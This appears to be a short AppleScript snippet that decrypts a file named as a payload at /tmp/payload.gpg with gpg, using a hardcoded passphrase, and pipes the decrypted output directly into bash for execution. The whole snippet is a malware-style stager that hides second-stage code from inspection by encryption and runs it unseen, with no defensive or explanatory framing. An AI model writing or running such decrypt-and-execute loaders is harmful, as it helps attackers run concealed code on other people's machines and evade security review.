-- Assume encrypted file is downloaded to disk
set path to "/tmp/payload.gpg"
set pass to "p@ssw0rd"

-- Decrypt and run
do shell script "gpg --batch --passphrase " & pass & " -d " & path & " | bash"
